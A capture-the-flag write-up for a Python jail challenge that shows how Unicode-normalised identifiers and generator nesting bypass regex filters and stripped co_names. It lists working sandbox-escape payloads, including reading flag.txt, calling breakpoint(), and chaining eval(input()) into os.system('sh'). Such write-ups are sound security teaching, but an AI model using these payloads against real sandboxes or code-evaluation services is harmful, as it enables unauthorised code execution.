## Jail Challenge: Horse with no Neighs (332)

Note: upsolved, but did a writeup because I found it interesting

### Description/Source

```py
#!/usr/bin/python3
import re
import random
horse = input("Begin your journey: ")
if re.search(r"[a-zA-Z]{4}", horse):
    print("It has begun raining, so you return home.")
elif len(set(re.findall(r"[\W]", horse))) > 4:
    print(set(re.findall(r"[\W]", horse)))
    print("A dead horse cannot bear the weight of all those special characters. You return home.")
else:
    discovery = list(eval(compile(horse, "<horse>", "eval").replace(co_names=())))
    random.shuffle(discovery)
    print("You make it through the journey, but are severely dehydrated. This is all you can remember:", discovery)

```

- We cannot have more than 4 `[a-zA-Z]` characters in a row.
- We cannot have more than 4 unique non-word characters (alphanumeric and underscore)

However we can bypass this by using unicode normalized characters which will not be matched by the first check (which only check the 52 upper and lower case characters), but will pass the second check because it is still considered alphanumeric

However in order to get a working payload, it needs to be nested into a generator or a list comprehension because after the compilation step, `co_names` are removed.

> co_names is a tuple containing the names used by the bytecode;

This can be seen using this piece of code

```py
test = "print(1)"
x = compile(test, "<test>", "eval")
print(x.co_names) #('print',)
test = "(print(1)for(x)in(1,))"
x = compile(test, "<test>", "eval")
print(x.co_names) # ()
```

The `co_names` will include the function name called (and subsequently removed) if it is not nested in a loop, and will crash the eval.

### Solves

1. @The.Moodle

```
((l)for(a)in("a")for(l)in(𝘰𝘱𝘦𝘯("\x2ff""lag\x2e""txt")))
```

2. @TheBadGod

```py
(bｒｅａｋｐｏｉｎｔ()for(x)in(1,))
```

3. @maple3142

```py
[bｒｅａｋｐｏｉｎｔ()for(x)in[1]]
```

4. @TWY

```py
(ᵉval(inpᵤt()) for i in (1,))
__import__('os').system('sh')
```

Piece of Code to check all Unicode characters that normalise weirdly

```py
import unicodedata

for i in range(0x110000):
    c = chr(i)
    if unicodedata.normalize('NFKC', c) != c:
        print(c, unicodedata.normalize('NFKC', c))
```

### Flag

```
uiuctf{my_challenges_always_have_unintended_solutions_and_i_am_less_okay_with_that}
```

### References

- https://docs.python.org/3/reference/lexical_analysis.html#identifiers
- https://lingojam.com/FancyTextGenerator
